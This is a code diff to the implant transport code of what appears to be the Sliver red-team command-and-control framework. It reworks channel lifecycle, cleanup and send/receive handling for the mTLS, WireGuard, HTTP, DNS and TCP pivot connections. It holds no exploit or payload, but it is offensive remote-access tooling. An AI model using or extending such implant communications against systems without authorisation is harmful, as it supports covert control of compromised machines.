@@ -69,9 +69,8 @@ import (
 	// {{if not .Config.IncludeNamePipe}}
 	"net/url"
 	"sync"
-
-	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	// {{end}}
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	"io"
 	"time"
@@ -84,6 +83,40 @@ var (
 
 type Start func() error
 type Stop func() error
+
+// nextSendEnvelope waits for the next usable transport envelope or the owning
+// connection to end. Producer channels intentionally remain open across
+// cleanup, so transport senders must use the connection lifecycle instead of
+// ranging over Send.
+func nextSendEnvelope(connection *Connection, send <-chan *pb.Envelope) (*pb.Envelope, bool) {
+	if connection == nil {
+		return nil, false
+	}
+	for {
+		select {
+		case <-connection.Done():
+			return nil, false
+		default:
+		}
+		select {
+		case envelope, ok := <-send:
+			if !ok {
+				return nil, false
+			}
+			select {
+			case <-connection.Done():
+				return nil, false
+			default:
+			}
+			if envelope == nil {
+				continue
+			}
+			return envelope, true
+		case <-connection.Done():
+			return nil, false
+		}
+	}
+}
 
 // StartConnectionLoop - Starts the main connection loop
 func StartConnectionLoop(abort <-chan struct{}, temporaryC2 ...string) <-chan *Connection {
@@ -214,7 +247,6 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 		ctrl:    ctrl,
 		tunnels: map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
-		once:    &sync.Once{},
 		IsOpen:  false,
 		uri:     uri,
 
@@ -230,7 +262,6 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 			if conn != nil {
 				conn.Close()
 			}
-			close(recv)
 		},
 	}
 
@@ -443,7 +474,6 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 		ctrl:    ctrl,
 		tunnels: map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
-		once:    &sync.Once{},
 		uri:     uri,
 		IsOpen:  false,
 		cleanup: func() {
@@ -452,7 +482,6 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 			// {{end}}
 			close(done)
 			closeTransport()
-			close(recv)
 		},
 	}
 
@@ -633,7 +662,6 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 		ctrl:    ctrl,
 		tunnels: map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
-		once:    &sync.Once{},
 		uri:     uri,
 		IsOpen:  false,
 		cleanup: func() {
@@ -641,7 +669,6 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 			log.Printf("[http] lost connection, cleanup...")
 			// {{end}}
 			ctrl <- struct{}{}
-			close(recv)
 		},
 	}
 
@@ -670,11 +697,26 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 
 		go func() {
 			defer connection.Cleanup()
-			for envelope := range send {
+			sendSem := make(chan struct{}, 64)
+			for {
+				envelope, ok := nextSendEnvelope(connection, send)
+				if !ok {
+					return
+				}
 				// {{if .Config.Debug}}
 				log.Printf("[http] send envelope ...")
 				// {{end}}
-				go client.WriteEnvelope(envelope)
+				select {
+				case sendSem <- struct{}{}:
+				case <-connection.Done():
+					return
+				}
+				go func(envelope *pb.Envelope) {
+					defer func() { <-sendSem }()
+					if err := client.WriteEnvelope(envelope); err != nil {
+						connection.Cleanup()
+					}
+				}(envelope)
 			}
 		}()
 
@@ -697,7 +739,11 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 					case nil:
 						errCount = 0
 						if envelope != nil {
-							recv <- envelope
+							select {
+							case recv <- envelope:
+							case <-connection.Done():
+								return
+							}
 						}
 					case *url.Error:
 						errCount++
@@ -754,14 +800,12 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 		ctrl:    ctrl,
 		tunnels: map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
-		once:    &sync.Once{},
 		IsOpen:  true,
 		cleanup: func() {
 			// {{if .Config.Debug}}
 			log.Printf("[dns] lost connection, cleanup...")
 			// {{end}}
 			ctrl <- struct{}{} // Stop polling
-			close(recv)
 		},
 	}
 
@@ -789,8 +833,14 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 
 		go func() {
 			defer connection.Cleanup()
-			for envelope := range send {
-				client.WriteEnvelope(envelope)
+			for {
+				envelope, ok := nextSendEnvelope(connection, send)
+				if !ok {
+					return
+				}
+				if err := client.WriteEnvelope(envelope); err != nil {
+					return
+				}
 			}
 		}()
 
@@ -807,7 +857,11 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 					case nil:
 						errCount = 0
 						if envelope != nil {
-							recv <- envelope
+							select {
+							case recv <- envelope:
+							case <-connection.Done():
+								return
+							}
 						}
 						time.Sleep(time.Millisecond * 250)
 					case dnsclient.ErrTimeout:
@@ -863,7 +917,6 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 		ctrl:    ctrl,
 		tunnels: map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
-		once:    &sync.Once{},
 		IsOpen:  true,
 		cleanup: func() {
 			// {{if .Config.Debug}}
@@ -871,7 +924,6 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 			// {{end}}
 			pingCtrl <- struct{}{}
 			ctrl <- struct{}{}
-			close(recv)
 		},
 	}
 
@@ -908,9 +960,11 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 					data, _ := proto.Marshal(&pb.PivotPing{
 						Nonce: uint32(time.Now().UnixNano()),
 					})
-					connection.Send <- &pb.Envelope{
+					if !connection.SendEnvelope(&pb.Envelope{
 						Type: pb.MsgPivotPeerPing,
 						Data: data,
+					}) {
+						return
 					}
 					// {{if .Config.Debug}}
 					log.Printf("[tcp pivot] server ping...")
@@ -918,9 +972,11 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 					data, _ = proto.Marshal(&pb.PivotPing{
 						Nonce: uint32(time.Now().UnixNano()),
 					})
-					connection.Send <- &pb.Envelope{
+					if !connection.SendEnvelope(&pb.Envelope{
 						Type: pb.MsgPivotServerPing,
 						Data: data,
+					}) {
+						return
 					}
 				}
 			}
@@ -930,11 +986,17 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 			defer func() {
 				connection.Cleanup()
 			}()
-			for envelope := range send {
+			for {
+				envelope, ok := nextSendEnvelope(connection, send)
+				if !ok {
+					return
+				}
 				// {{if .Config.Debug}}
 				log.Printf("[tcp pivot] send loop envelope type %d\n", envelope.Type)
 				// {{end}}
-				pivot.WriteEnvelope(envelope)
+				if err := pivot.WriteEnvelope(envelope); err != nil {
+					return
+				}
 			}
 		}()
 
@@ -967,7 +1029,11 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 					continue
 				}
 				if err == nil {
-					recv <- envelope
+					select {
+					case recv <- envelope:
+					case <-connection.Done():
+						return
+					}
 					// {{if .Config.Debug}}
 					log.Printf("[tcp pivot] Receive loop envelope type %d\n", envelope.Type)
 					// {{end}}
